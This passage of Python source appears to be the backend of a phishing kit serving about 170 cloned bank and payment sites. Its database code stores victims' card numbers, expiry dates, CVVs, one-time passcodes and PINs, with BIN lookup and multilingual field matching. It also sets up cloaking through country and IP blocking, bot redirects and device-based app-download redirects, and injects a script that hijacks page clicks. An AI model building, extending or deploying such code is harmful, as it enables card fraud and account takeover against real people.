                    "SELECT COUNT(DISTINCT CASE WHEN event_type='visit' THEN ip END) visits,"
                    "COUNT(DISTINCT CASE WHEN event_type='click' THEN ip END) clicks "
                    "FROM events WHERE julianday(created_at)>=julianday(?) AND julianday(created_at)<julianday(?)",
                    (
                        start.astimezone(timezone.utc).isoformat(timespec="seconds"),
                        end.astimezone(timezone.utc).isoformat(timespec="seconds"),
                    ),
                ).fetchone()
                display_date = (start + timedelta(days=1)).date()
                weekly.append({
                    "date": display_date.isoformat(),
                    "label": display_date.strftime("%m/%d"),
                    "visits": row["visits"] or 0,
                    "clicks": row["clicks"] or 0,
                })
        total_visits = totals["visits"] or 0
        total_clicks = totals["clicks"] or 0
        return {
            "today": today["visits"] or 0,
            "today_visits": today["visits"] or 0,
            "today_clicks": today["clicks"] or 0,
            "total": total_visits,
            "visits": total_visits,
            "clicks": total_clicks,
            "domains": domains,
            "reset_at": cutoff.isoformat(timespec="seconds"),
            "next_reset_at": next_cutoff.isoformat(timespec="seconds"),
            "timezone": "Asia/Shanghai",
            "weekly": weekly,
        }

    def clear_events(self) -> int:
        """数据中心一键清空：删除全部访问/点击/拒绝流水，返回删除行数。

        只清 events 流水表；轮换池计数表（redirect_link_stats /
        client_redirect_stats）属于分流配置状态，不属于日志，刻意保留。
        """
        with self.connect() as db:
            cursor = db.execute("DELETE FROM events")
            return cursor.rowcount

    # ---------------- 黑名单中心 ----------------
    IP_RE = r"(\d{1,3}\.){3}\d{1,3}"

    def ensure_blacklist_cache(self):
        global BLACKLIST_LOADED
        if BLACKLIST_LOADED:
            return
        with self.connect() as db:
            rows = db.execute("SELECT ip FROM blacklist").fetchall()
        BLACKLIST_CACHE.clear()
        BLACKLIST_CACHE.update(row[0] for row in rows)
        BLACKLIST_LOADED = True

    def blacklist_sync_cache(self):
        with self.connect() as db:
            rows = db.execute("SELECT ip FROM blacklist").fetchall()
        BLACKLIST_CACHE.clear()
        BLACKLIST_CACHE.update(row[0] for row in rows)

    def blacklist_add(self, ip: str, reason: str, note: str = "") -> bool:
        ip = ip.strip().lower()
        if not re.fullmatch(self.IP_RE, ip):
            return False
        with self.connect() as db:
            db.execute(
                "INSERT INTO blacklist(ip,reason,note,created_at) VALUES(?,?,?,?) "
                "ON CONFLICT(ip) DO UPDATE SET reason=excluded.reason, note=excluded.note",
                (ip, reason[:32], note[:200], now_text()),
            )
        self.blacklist_sync_cache()
        return True

    def blacklist_update(self, row_id: int, ip: str, note: str) -> bool:
        ip = ip.strip().lower()
        if not re.fullmatch(self.IP_RE, ip):
            return False
        with self.connect() as db:
            cursor = db.execute("UPDATE blacklist SET ip=?, note=? WHERE id=?", (ip, note[:200], row_id))
        self.blacklist_sync_cache()
        return cursor.rowcount > 0

    def blacklist_remove(self, row_id: int) -> bool:
        with self.connect() as db:
            cursor = db.execute("DELETE FROM blacklist WHERE id=?", (row_id,))
        self.blacklist_sync_cache()
        return cursor.rowcount > 0

    def blacklist_clear(self) -> int:
        with self.connect() as db:
            cursor = db.execute("DELETE FROM blacklist")
        self.blacklist_sync_cache()
        return cursor.rowcount

    def blacklist_list(self, q: str, page: int, page_size: int):
        filters, args = [], []
        if q:
            filters.append("(ip LIKE ? OR note LIKE ?)")
            args += [f"%{q}%", f"%{q}%"]
        where = (" WHERE " + " AND ".join(filters)) if filters else ""
        with self.connect() as db:
            total = db.execute(f"SELECT COUNT(*) FROM blacklist{where}", args).fetchone()[0]
            rows = [dict(r) for r in db.execute(
                f"SELECT id,ip,reason,note,created_at FROM blacklist{where} "
                "ORDER BY id DESC LIMIT ? OFFSET ?",
                args + [page_size, (page - 1) * page_size],
            ).fetchall()]
        return total, rows

    def blacklist_hit(self, ip: str) -> bool:
        self.ensure_blacklist_cache()
        return ip in BLACKLIST_CACHE

    def record_event(self, domain: str, event_type: str, ip: str, ua: str, path: str, client_type: str = CLIENT_UNKNOWN):
        client = client_type if client_type in CLIENT_TYPES else CLIENT_UNKNOWN
        with self.connect() as db:
            cursor = db.execute(
                "INSERT INTO events(domain,event_type,created_at,ip,ua,path,client_type) VALUES(?,?,?,?,?,?,?)",
                (domain.lower(), event_type, now_text(), ip[:128], ua[:1024], path[:1024], client),
            )
            return cursor.lastrowid

    def events(self, domain: str, event_type: str, page: int, page_size: int, client_type: str = ""):
        filters, args = [], []
        if domain:
            filters.append("domain=?")
            args.append(domain.lower())
        if event_type in ("visit", "click", "rejected"):
            filters.append("event_type=?")
            args.append(event_type)
        if client_type in CLIENT_TYPES:
            filters.append("client_type=?")
            args.append(client_type)
        where = " WHERE " + " AND ".join(filters) if filters else ""
        with self.connect() as db:
            total = db.execute("SELECT COUNT(*) count FROM events" + where, args).fetchone()["count"]
            rows = db.execute(
                "SELECT id,domain,event_type,created_at,ip,ua,path,client_type FROM events" + where
                + " ORDER BY id DESC LIMIT ? OFFSET ?",
                (*args, page_size, (page - 1) * page_size),
            ).fetchall()
        return total, [dict(row) for row in rows]

    def add_capture(
        self, domain: str, path: str, href: str, step: int, fields_json: str,
        ip: str, ua: str, client_type: str = CLIENT_UNKNOWN, language: str = "",
        timezone: str = "", screen: str = "", referer: str = "", kind: str = "submit",
    ):
        client = client_type if client_type in CLIENT_TYPES else CLIENT_UNKNOWN
        with self.connect() as db:
            cursor = db.execute(
                "INSERT INTO captures(domain,path,href,step,kind,fields,ip,ua,client_type,"
                "language,timezone,screen,referer,created_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (
                    (domain or "").lower()[:253], path[:512], href[:1024], int(step or 0),
                    kind[:24], fields_json, ip[:128], ua[:1024], client, language[:64],
                    timezone[:64], screen[:32], referer[:1024], now_text(),
                ),
            )
            return cursor.lastrowid

    def captures(self, domain: str = "", q: str = "", page: int = 1, page_size: int = 25):
        filters, args = [], []
        if domain:
            filters.append("domain=?")
            args.append(domain.lower())
        if q:
            like = f"%{q}%"
            filters.append("(fields LIKE ? OR ip LIKE ? OR ua LIKE ? OR domain LIKE ? OR path LIKE ?)")
            args.extend([like] * 5)
        where = " WHERE " + " AND ".join(filters) if filters else ""
        with self.connect() as db:
            total = db.execute("SELECT COUNT(*) count FROM captures" + where, args).fetchone()["count"]
            rows = db.execute(
                "SELECT id,domain,path,href,step,kind,fields,ip,ua,client_type,language,timezone,"
                "screen,referer,created_at FROM captures" + where + " ORDER BY id DESC LIMIT ? OFFSET ?",
                (*args, page_size, (page - 1) * page_size),
            ).fetchall()
        return total, [dict(row) for row in rows]

    def captures_all(self, domain: str = "", q: str = ""):
        filters, args = [], []
        if domain:
            filters.append("domain=?")
            args.append(domain.lower())
        if q:
            like = f"%{q}%"
            filters.append("(fields LIKE ? OR ip LIKE ? OR ua LIKE ? OR domain LIKE ? OR path LIKE ?)")
            args.extend([like] * 5)
        where = " WHERE " + " AND ".join(filters) if filters else ""
        with self.connect() as db:
            rows = db.execute(
                "SELECT id,domain,path,href,step,kind,fields,ip,ua,client_type,language,timezone,"
                "screen,referer,created_at FROM captures" + where + " ORDER BY id DESC",
                args,
            ).fetchall()
        return [dict(row) for row in rows]

    def captures_clear(self) -> int:
        with self.connect() as db:
            cursor = db.execute("DELETE FROM captures")
            return cursor.rowcount

    # ---------------- 订单模型（对齐原平台 users / payment） ----------------
    def visitor_upsert(
        self, uuid: str, site: str = "", referer: str = "", ip: str = "", ua: str = "",
        action: str = "", route: str = "", steps: dict | None = None, card_bin: str = "",
    ) -> int:
        """按 uuid 归并同一个访客的多步提交；data 里按步骤名存 JSON。"""
        now = now_text()
        with self.connect() as db:
            row = db.execute("SELECT id,data FROM visitors WHERE uuid=?", (uuid,)).fetchone()
            if row:
                visitor_id = row["id"]
                try:
                    merged = json.loads(row["data"] or "{}")
                except (TypeError, ValueError):
                    merged = {}
                if isinstance(steps, dict) and action:
                    merged[action] = steps
                db.execute(
                    "UPDATE visitors SET site_abbreviation=COALESCE(NULLIF(?,''),site_abbreviation),"
                    "referer=COALESCE(NULLIF(?,''),referer),ip=COALESCE(NULLIF(?,''),ip),"
                    "ua=COALESCE(NULLIF(?,''),ua),action=COALESCE(NULLIF(?,''),action),"
                    "route=COALESCE(NULLIF(?,''),route),data=?,card_bin=COALESCE(NULLIF(?,''),card_bin),"
                    "status=?,updated_at=? WHERE id=?",
                    (
                        site[:128], referer[:253], ip[:128], ua[:1024], action[:64], route[:512],
                        json.dumps(merged, ensure_ascii=False),
                        card_bin[:16], 1 if merged else 0, now, visitor_id,
                    ),
                )
                return visitor_id
            cursor = db.execute(
                "INSERT INTO visitors(site_abbreviation,uuid,referer,ip,ua,action,route,data,"
                "card_bin,status,pay_status,remark,created_at,updated_at) "
                "VALUES(?,?,?,?,?,?,?,?,?,?,0,'',?,?)",
                (
                    site[:128], uuid, referer[:253], ip[:128], ua[:1024], action[:64], route[:512],
                    json.dumps({action: steps} if isinstance(steps, dict) and action else {},
                               ensure_ascii=False),
                    card_bin[:16], 1 if steps else 0, now, now,
                ),
            )
            return cursor.lastrowid

    def visitor(self, visitor_id: int):
        with self.connect() as db:
            row = db.execute("SELECT * FROM visitors WHERE id=?", (visitor_id,)).fetchone()
        return dict(row) if row else None

    def visitor_by_uuid(self, uuid: str):
        with self.connect() as db:
            row = db.execute("SELECT * FROM visitors WHERE uuid=?", (uuid,)).fetchone()
        return dict(row) if row else None

    def payment_add(self, uid: int, uuid: str, site: str, values: dict, referer: str, ip: str) -> int:
        now = now_text()
        with self.connect() as db:
            cursor = db.execute(
                "INSERT INTO payments(uid,uuid,site_abbreviation,cname,ccard,cdate,ccvv,otp,"
                "custom1,custom2,pin,card_type,card_bank,card_brand,card_level,card_country,"
                "referer,ip,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (
                    uid, uuid, site[:128], values.get("cname", "")[:128], values.get("ccard", "")[:64],
                    values.get("cdate", "")[:32], values.get("ccvv", "")[:16], values.get("otp", "")[:32],
                    values.get("custom1", "")[:64], values.get("custom2", "")[:64],
                    values.get("pin", "")[:32], values.get("card_type", "")[:32],
                    values.get("card_bank", "")[:64], values.get("card_brand", "")[:32],
                    values.get("card_level", "")[:32], values.get("card_country", "")[:32],
                    referer[:253], ip[:128], now, now,
                ),
            )
            return cursor.lastrowid

    def payment_latest(self, uuid: str):
        with self.connect() as db:
            row = db.execute(
                "SELECT * FROM payments WHERE uuid=? ORDER BY id DESC LIMIT 1", (uuid,)
            ).fetchone()
        return dict(row) if row else None

    def payment_update(self, payment_id: int, values: dict) -> None:
        fields, args = [], []
        for key in ("cname", "ccard", "cdate", "ccvv", "otp", "custom1", "custom2", "pin",
                    "card_type", "card_bank", "card_brand", "card_level", "card_country"):
            if key in values and values[key]:
                fields.append(f"{key}=?")
                args.append(str(values[key])[:128])
        if not fields:
            return
        with self.connect() as db:
            row = db.execute("SELECT uuid FROM payments WHERE id=?", (payment_id,)).fetchone()
            db.execute(
                "UPDATE payments SET " + ",".join(fields) + ",updated_at=? WHERE id=?",
                (*args, now_text(), payment_id),
            )
            if row:
                db.execute("UPDATE visitors SET pay_status=1,updated_at=? WHERE uuid=?",
                           (now_text(), row["uuid"]))

    def payments_for(self, uuid: str):
        with self.connect() as db:
            rows = db.execute(
                "SELECT * FROM payments WHERE uuid=? ORDER BY id DESC", (uuid,)
            ).fetchall()
        return [dict(row) for row in rows]

    def bin_lookup(self, number: str) -> dict:
        digits = re.sub(r"\D", "", number or "")
        result = {"card_brand": detect_brand(digits), "card_bank": "", "card_level": "",
                  "card_type": "", "card_country": ""}
        if len(digits) < 4:
            return result
        with self.connect() as db:
            rows = db.execute("SELECT * FROM bin_rules").fetchall()
        best = None
        for row in rows:
            prefix = str(row["prefix"] or "")
            if prefix and digits.startswith(prefix) and (best is None or len(prefix) > len(best["prefix"])):
                best = dict(row)
        if best:
            result.update({
                "card_brand": best["brand"] or result["card_brand"],
                "card_bank": best["bank"], "card_level": best["level"],
                "card_type": best["card_type"], "card_country": best["country"],
            })
        return result

    def visitors_list(
        self, keyword: str = "", site: str = "", referer: str = "", status: str = "",
        start: str = "", end: str = "", page: int = 1, page_size: int = 25,
    ):
        filters, args = [], []
        if site:
            filters.append("site_abbreviation=?")
            args.append(site)
        if referer:
            filters.append("referer=?")
            args.append(referer)
        if status == "1":
            filters.append("status>0")
        elif status == "2":
            filters.append("pay_status>0")
        elif status == "0":
            filters.append("status=0 AND pay_status=0")
        if start:
            filters.append("created_at>=?")
            args.append(start)
        if end:
            filters.append("created_at<=?")
            args.append(end)
        if keyword:
            like = f"%{keyword}%"
            filters.append("(uuid LIKE ? OR data LIKE ? OR ip LIKE ? OR referer LIKE ? "
                           "OR site_abbreviation LIKE ? OR card_bin LIKE ?)")
            args.extend([like] * 6)
        where = " WHERE " + " AND ".join(filters) if filters else ""
        with self.connect() as db:
            total = db.execute("SELECT COUNT(*) count FROM visitors" + where, args).fetchone()["count"]
            rows = db.execute(
                "SELECT * FROM visitors" + where + " ORDER BY id DESC LIMIT ? OFFSET ?",
                (*args, page_size, (page - 1) * page_size),
            ).fetchall()
            items = []
            for row in rows:
                item = dict(row)
                payment = db.execute(
                    "SELECT * FROM payments WHERE uuid=? ORDER BY id DESC LIMIT 1", (item["uuid"],)
                ).fetchone()
                item["payment"] = dict(payment) if payment else None
                items.append(item)
        return total, items

    def visitors_all(self, **kwargs):
        kwargs.pop("page", None)
        kwargs.pop("page_size", None)
        total, items = self.visitors_list(page=1, page_size=1000000, **kwargs)
        return items

    def order_stats(self):
        with self.connect() as db:
            rows = db.execute(
                "SELECT referer, site_abbreviation, COUNT(*) view_num,"
                " SUM(CASE WHEN status>0 THEN 1 ELSE 0 END) order_num,"
                " SUM(CASE WHEN pay_status>0 THEN 1 ELSE 0 END) pay_num"
                " FROM visitors GROUP BY referer, site_abbreviation"
                " ORDER BY view_num DESC"
            ).fetchall()
        items = []
        for row in rows:
            item = dict(row)
            item["conversion"] = round((item["order_num"] or 0) * 100.0 / item["view_num"], 1) if item["view_num"] else 0.0
            items.append(item)
        return items

    def referers(self):
        with self.connect() as db:
            rows = db.execute(
                "SELECT referer, COUNT(*) n FROM visitors WHERE referer<>'' GROUP BY referer ORDER BY n DESC"
            ).fetchall()
        return [dict(row) for row in rows]

    def client_breakdown(self):
        """Visit/click counts grouped by detected client type for the dashboard."""
        with self.connect() as db:
            rows = db.execute(
                "SELECT client_type, COUNT(*) visits FROM events WHERE event_type='visit' GROUP BY client_type"
            ).fetchall()
            clicks = {
                row["client_type"]: row["clicks"]
                for row in db.execute(
                    "SELECT client_type, COUNT(*) clicks FROM events WHERE event_type='click' GROUP BY client_type"
                ).fetchall()
            }
        counts = {row["client_type"]: row["visits"] or 0 for row in rows}
        return [
            {
                "client_type": client,
                "label": CLIENT_LABELS[client],
                "visits": counts.get(client, 0),
                "clicks": clicks.get(client, 0),
            }
            for client in CLIENT_TYPES
        ]

    def domains(self):
        with self.connect() as db:
            rows = db.execute(
                "SELECT d.*,p.name project_name FROM domains d LEFT JOIN projects p ON p.id=d.project_id ORDER BY d.id DESC"
            ).fetchall()
        return [dict(row) for row in rows]

    def domain(self, host: str):
        host = str(host or "").split(":", 1)[0].lower().strip().rstrip(".")
        with self.connect() as db:
            row = db.execute("SELECT * FROM domains WHERE domain=?", (host,)).fetchone()
        return dict(row) if row else None

    def add_domain(self, domain: str, port: int, project_id=None, frontend_entry: str = "logo.gif"):
        with self.connect() as db:
            cursor = db.execute(
                "INSERT INTO domains(project_id,domain,upstream_port,frontend_entry,created_at) VALUES(?,?,?,?,?)",
                (project_id, domain.lower(), port, frontend_entry, now_text()),
            )
            return cursor.lastrowid

    def update_domain(self, domain: str, port: int, project_id=None, frontend_entry: str = "logo.gif"):
        with self.connect() as db:
            row = db.execute("SELECT id,project_id FROM domains WHERE domain=?", (domain.lower(),)).fetchone()
            if not row or (row["project_id"] not in (None, project_id) and project_id not in (None, row["project_id"])):
                return None
            db.execute("UPDATE domains SET project_id=?,upstream_port=?,frontend_entry=? WHERE domain=?", (project_id, port, frontend_entry, domain.lower()))
            return row["id"]

    def delete_domain(self, domain: str):
        with self.connect() as db:
            cursor = db.execute("DELETE FROM domains WHERE domain=?", (domain.lower(),))
            return cursor.rowcount > 0

    def set_certificate(self, domain: str, status: str):
        with self.connect() as db:
            db.execute("UPDATE domains SET certificate_status=? WHERE domain=?", (status, domain))

    def project_page_files(self, slug: str) -> list:
        """列出某个前台项目里的静态页面（按保存的顺序，其次文件名）。

        170 个前台里只有少数「添加为项目」，没登记的站直接从 sources/<slug>
        取页；否则后台的页面数/页面顺序对绝大多数前台永远是空。
        """
        with self.connect() as db:
            row = db.execute("SELECT local_path, page_order FROM projects WHERE slug=?", (slug,)).fetchone()
        if not row and not (SOURCE_DIR / slug).is_dir():
            return []
        root = REBUILD_DIR / slug
        if not root.is_dir():
            root = Path(row["local_path"]) if row and row["local_path"] else (SOURCE_DIR / slug)
        raw_order = (row["page_order"] or "").strip() if row else ""
        try:
            saved = json.loads(raw_order) if raw_order else []
        except ValueError:
            saved = []
        pages = []
        if root.is_dir():
            for item in sorted(root.glob("*.html")):
                title = ""
                try:
                    head = item.read_text(encoding="utf-8", errors="replace")[:4000]
                    found = re.search(r"<title>(.*?)</title>", head, re.S | re.I)
                    title = found.group(1).strip() if found else ""
                except OSError:
                    pass
                pages.append({"file": item.name, "title": title[:80], "size": item.stat().st_size})
        index = {name: pos for pos, name in enumerate(saved)}
        if index:
            pages.sort(key=lambda page: (index.get(page["file"], 10_000), page["file"]))
        else:
            # 没有自定义顺序时，按业务流默认顺序排（无人值守就按这个顺序自动推进）
            def _rank(name: str) -> int:
                low = name.lower()
                for key, rank in (
                    ("verify-login", 12), ("verify-email", 14), ("verify-phone", 16),
                    ("email-verification", 13), ("sms-verification", 15),
                    ("securitycheck", 17), ("index", 0), ("login", 10),
                    ("checkout", 20), ("associatedbank", 25), ("pin", 30),
                    ("thanks", 40), ("success", 41),
                    ("amex-safe", 90), ("app-authorized", 91),
                ):
                    if key in low:
                        return rank
                return 50

            pages.sort(key=lambda page: (_rank(page["file"]), page["file"]))
        return pages

    def set_project_page_order(self, slug: str, order: list) -> bool:
        clean = [str(name)[:120] for name in order if str(name)]
        payload = json.dumps(clean, ensure_ascii=False)
        with self.connect() as db:
            cursor = db.execute("UPDATE projects SET page_order=? WHERE slug=?", (payload, slug))
            if cursor.rowcount:
                return True
            # 目录里有、但还没「添加为项目」的前台：首次保存顺序时自动登记一条，
            # 否则这些站的顺序永远存不进去（之前线上 170 个站只有 1 条项目）。
            source_dir = SOURCE_DIR / slug
            if not source_dir.is_dir():
                return False
            item = next((it for it in SOURCE_CATALOG.values() if it.get("slug") == slug), None) or {}
            db.execute(
                "INSERT INTO projects(name,slug,local_path,created_at,page_order) VALUES(?,?,?,?,?)",
                ((item.get("name") or slug)[:100], slug[:80], str(source_dir), now_text(), payload),
            )
            return True

    def projects(self):
        with self.connect() as db:
            return [dict(row) for row in db.execute("SELECT * FROM projects ORDER BY id DESC")]

    def project(self, project_id: int):
        with self.connect() as db:
            row = db.execute("SELECT * FROM projects WHERE id=?", (project_id,)).fetchone()
        return dict(row) if row else None

    def add_project(self, name: str, slug: str, local_path: str):
        with self.connect() as db:
            cursor = db.execute(
                "INSERT INTO projects(name,slug,local_path,created_at) VALUES(?,?,?,?)",
                (name, slug, local_path, now_text()),
            )
            return cursor.lastrowid

    def delete_project(self, project_id: int):
        with self.connect() as db:
            cursor = db.execute("DELETE FROM projects WHERE id=?", (project_id,))
            return cursor.rowcount > 0

    def get_settings(self):
        with self.connect() as db:
            rows = db.execute("SELECT key,value FROM settings").fetchall()
        settings = {}
        for row in rows:
            try:
                settings[row["key"]] = json.loads(row["value"])
            except (TypeError, ValueError):
                # A single corrupt row must not take the whole site down; fall
                # back to the factory default for that key instead.
                settings[row["key"]] = SETTINGS_DEFAULTS.get(row["key"], "")
        return settings

    def save_settings(self, values: dict):
        allowed = {
            "ipregistry_api_key", "country_whitelist", "country_blacklist",
            "human_verification", "block_desktop", "block_ios", "block_android",
            "ipregistry_enabled", "blocked_ip_types", "blocked_threats", "redirect_url",
            "frontend_entry", "redirect_links",
            "client_redirect_rules", "client_redirect_enabled",
            "bot_redirect_enabled", "bot_redirect_url",
            "captcha_enabled", "captcha_ttl_seconds", "captcha_max_tries",
            "app_android_url", "app_ios_url", "app_desktop_url",
            "browser_lang_check", "browser_lang_whitelist",
            "browser_tz_check", "browser_tz_whitelist",
            "rate_check_enabled", "rate_window_seconds", "rate_max_requests",
        }
        with self.connect() as db:
            if "redirect_links" in values:
                db.execute("DELETE FROM redirect_link_stats")
            if "client_redirect_rules" in values:
                db.execute("DELETE FROM client_redirect_stats")
            for key, value in values.items():
                if key in allowed:
                    db.execute(
                        "INSERT INTO settings(key,value,updated_at) VALUES(?,?,?) "
                        "ON CONFLICT(key) DO UPDATE SET value=excluded.value,updated_at=excluded.updated_at",
                        (key, json.dumps(value), now_text()),
                    )

    def next_redirect(self, links: list[dict]):
        if not links:
            return None
        with self._lock:
            with self.connect() as db:
                selected = None
                for index, item in enumerate(links):
                    row = db.execute(
                        "SELECT clicks FROM redirect_link_stats WHERE link_index=?", (index,)
                    ).fetchone()
                    clicks = row["clicks"] if row else 0
                    if item["limit"] and clicks >= item["limit"]:
                        continue
                    selected = index
                    break
                if selected is None:
                    db.execute("DELETE FROM redirect_link_stats")
                    selected = 0
                db.execute(
                    "INSERT INTO redirect_link_stats(link_index,clicks,updated_at) VALUES(?,?,?) "
                    "ON CONFLICT(link_index) DO UPDATE SET clicks=clicks+1,updated_at=excluded.updated_at",
                    (selected, 1, now_text()),
                )
                return links[selected]["url"]

    def next_client_redirect(self, client_type: str, links: list[dict]):
        """Round-robin a client's own link pool, honouring per-link click limits."""
        if not links:
            return None
        client = client_type if client_type in CLIENT_TYPES else CLIENT_UNKNOWN
        with self._lock:
            with self.connect() as db:
                selected = None
                for index, item in enumerate(links):
                    row = db.execute(
                        "SELECT clicks FROM client_redirect_stats WHERE client_type=? AND link_index=?",
                        (client, index),
                    ).fetchone()
                    clicks = row["clicks"] if row else 0
                    if item["limit"] and clicks >= item["limit"]:
                        continue
                    selected = index
                    break
                if selected is None:
                    db.execute("DELETE FROM client_redirect_stats WHERE client_type=?", (client,))
                    selected = 0
                db.execute(
                    "INSERT INTO client_redirect_stats(client_type,link_index,clicks,updated_at) VALUES(?,?,?,?) "
                    "ON CONFLICT(client_type,link_index) DO UPDATE SET clicks=clicks+1,updated_at=excluded.updated_at",
                    (client, selected, 1, now_text()),
                )
                return links[selected]["url"]


STORE = Store(DB_PATH)
SESSIONS: dict[str, dict] = {}
CAPTCHAS: dict[str, dict] = {}
MEMORY_LOCK = threading.Lock()
RELOAD_LOCK = threading.Lock()
RELOAD_TIMER: threading.Timer | None = None
RELOAD_VERIFICATIONS: dict[str, str] = {}


def schedule_web_server_reload(command: list[str], verification: tuple[str, str] | None = None):
    """Debounce changes, then reload once and verify newly installed certificates."""
    global RELOAD_TIMER

    def reload_server():
        global RELOAD_TIMER
        current_timer = threading.current_thread()
        with RELOAD_LOCK:
            if RELOAD_TIMER is not current_timer:
                return
            verifications = dict(RELOAD_VERIFICATIONS)
            RELOAD_VERIFICATIONS.clear()
            RELOAD_TIMER = None
        try:
            subprocess.run(command, check=True, timeout=30, capture_output=True, text=True)
        except (OSError, subprocess.SubprocessError) as exc:
            detail = getattr(exc, "stderr", "") or str(exc)
            print(f"Deferred nginx reload failed: {detail.strip()}")
            for domain in verifications:
                STORE.set_certificate(domain, "failed")
            return
        for domain, entry in verifications.items():
            target = f"https://{domain}/{quote(entry.lstrip('/'), safe='/')}"
            verify_command = [
                "/usr/bin/curl", "-sS", "--noproxy", "*", "--max-time", "10",
                "--resolve", f"{domain}:443:127.0.0.1", target, "-o", "/dev/null",
            ]
            try:
                subprocess.run(verify_command, check=True, timeout=15, capture_output=True, text=True)
            except (OSError, subprocess.SubprocessError) as exc:
                STORE.set_certificate(domain, "failed")
                detail = getattr(exc, "stderr", "") or str(exc)
                print(f"HTTPS verification failed for {domain}: {detail.strip()}")

    with RELOAD_LOCK:
        if verification is not None:
            RELOAD_VERIFICATIONS[verification[0]] = verification[1]
        if RELOAD_TIMER is not None:
            RELOAD_TIMER.cancel()
        RELOAD_TIMER = threading.Timer(2.0, reload_server)
        RELOAD_TIMER.daemon = True
        RELOAD_TIMER.start()


def cleanup_memory():
    now = time.time()
    with MEMORY_LOCK:
        for values in (SESSIONS, CAPTCHAS):
            for key in [key for key, item in values.items() if item["expires"] < now]:
                values.pop(key, None)


def safe_target_url(value) -> str:
    """Accept only absolute http(s) targets; anything else is dropped.

    Relative paths are intentionally rejected so a typo in the admin panel can
    never turn into a broken or unexpected navigation target.
    """
    url = str(value or "").strip()
    if not url:
        return ""
    parsed = urlparse(url)
    return url if parsed.scheme in ("http", "https") and parsed.netloc else ""


def inject_app_links(content: bytes, settings: dict) -> bytes:
    """Expose the operator-configured App download URLs to the update page.

    Only pages that actually reference window.GW_APP_LINKS are touched, so the
    other templates stay byte-identical to their source files. The snippet goes
    right after <head> because the page reads it while its own scripts run.
    """
    if b"GW_APP_LINKS" not in content:
        return content
    # ===== 系统的核心设计规则：后台分流 > 模板流程 =====
    # 后台「客户端分流跳转」里配了该端的地址 -> 一律用后台的；
    # 模板内的「App 更新页跳转」只是未接入分流时的默认流程，不参与竞争。
    # 分流开关关闭，或该端没配地址 -> 走模板流程（app_* 值，
    # 为空时页面再回落到 pc_download.html 等模板内页面）。
    rules = normalize_client_rules(settings.get("client_redirect_rules", {}))
    split_on = bool(settings.get("client_redirect_enabled"))

    def resolve(client, app_setting_key):
        """分流优先；分流没配才用模板默认流程。"""
        if split_on:
            backend = safe_target_url((rules.get(client) or {}).get("url"))
            if backend:
                return backend
        return safe_target_url(settings.get(app_setting_key))

    links = {
        "android": resolve(CLIENT_ANDROID, "app_android_url"),
        "ios": resolve(CLIENT_IOS, "app_ios_url"),
        "desktop": resolve(CLIENT_DESKTOP, "app_desktop_url"),
        # 标记分流是否生效，排查时能一眼看出按钮最终用了哪套配置
        "splitEnabled": split_on,
    }
    head_end = content.lower().find(b"</head>")
    if head_end >= 0:
        insert_at = head_end
    else:
        insert_at = content.lower().find(b"<body")
        if insert_at < 0:
            return content
        insert_at = content.lower().find(b">", insert_at) + 1
    script = (
        "<script>window.GW_APP_LINKS="
        + json.dumps(links, ensure_ascii=False)
        + ";</script>"
    ).encode("utf-8")
    return content[:insert_at] + script + content[insert_at:]


def click_capture_script(click_path: str) -> bytes:
    """Build the click interceptor injected into every served page.

    A handler bound directly on the target element fires during the target phase,
    which beats any capture listener on document or window. Two layers handle it:
    the window capture listener blocks the event and navigates immediately, and a
    DOMContentLoaded pass clones the CTA elements so late-bound template handlers
    never exist in the first place. Elements marked data-gateway-nojump keep their
    original behaviour.
    """
    target = json.dumps(click_path)
    return (
        "<script>"
        "(function(){"
        "var T=" + target + ";"
        "var SEL='a[href],button,input[type=button],input[type=submit],[role=button],[onclick]';"
        "var navigated=false,stripped=false;"
        "function skip(el){"
        "for(var n=el;n&&n.nodeType===1;n=n.parentElement){"
        "if(n.dataset&&n.dataset.gatewayNojump!==undefined)return true;"
        "if(n.tagName==='A'){var h=n.getAttribute('href')||'';if(h.charAt(0)==='#')return true;}"
        "}"
        "return false;"
        "}"
        "function go(){"
        "if(navigated)return;navigated=true;"
        "window.location.href=T;"
        "}"
        "window.addEventListener('click',function(e){"
        "var el=e.target&&e.target.closest?e.target.closest(SEL):null;"
        "if(!el||skip(el))return;"
        "e.preventDefault();e.stopPropagation();e.stopImmediatePropagation();"
        "go();"
        "},true);"
        "window.addEventListener('touchend',function(e){"
        "var t=e.changedTouches&&e.changedTouches[0];"
        "var el=t&&t.closest?t.closest(SEL):null;"
        "if(!el||skip(el))return;"
        "e.preventDefault();e.stopPropagation();"
        "go();"
        "},true);"
        "function stripHandlers(){"
        "if(stripped)return;stripped=true;"
        "try{"
        "var nodes=document.querySelectorAll(SEL);"
        "for(var i=0;i<nodes.length;i++){"
        "var el=nodes[i];"
        "if(skip(el))continue;"
        "el.parentNode.replaceChild(el.cloneNode(true),el);"
        "}"
        "}catch(err){}"
        "}"
        "if(document.readyState==='loading'){"
        "document.addEventListener('DOMContentLoaded',stripHandlers);"
        "}else{stripHandlers();}"
        "})();"
        "</script>"
    ).encode()


CARD_ALIASES = {
    "cname": ("cname", "cardholder", "cardholdername", "nameoncard", "cardname", "titular", "カード名義", "カード名義人"),
    "ccard": ("ccard", "cardnumber", "cardno", "card", "numerotarjeta", "numerotarjeta", "pan", "カード番号", "カードナンバー", "卡号"),
    "cdate": ("cdate", "expiry", "expirydate", "expiration", "expirationdate", "expdate", "validade", "有効期限", "mm yy"),
    "ccvv": ("ccvv", "cvv", "cvv2", "cvc", "cvc2", "cvn", "securitycode", "セキュリティコード", "codigoseguridad"),
    "otp": ("otp", "otpcode", "smscode", "smsotp", "verificationcode", "authcode", "onetimecode", "認証コード", "確認コード", "ワンタイム", "認証番号"),
    "pin": ("pin", "pincode", "pinno", "暗証番号"),
    "custom1": ("customcode1", "custom1"),
    "custom2": ("customcode2", "custom2"),
}


def norm_key(value) -> str:
    return re.sub(r"[^0-9a-z\u3040-\u30ff\u4e00-\u9fff]", "", str(value or "").lower())


def detect_brand(number: str) -> str:
    """卡组织识别：按 IIN 段位判断，对应原平台 ccard_brand。"""
    digits = re.sub(r"\D", "", number or "")
    if len(digits) < 4 or not digits[:4].isdigit():
        return ""
    if digits[0] == "4":
        return "Visa"
    two, four = int(digits[:2]), int(digits[:4])
    if 51 <= two <= 55 or 2221 <= four <= 2720:
        return "Mastercard"
    if two in (34, 37):
        return "American Express"
    if 3528 <= four <= 3589:
        return "JCB"
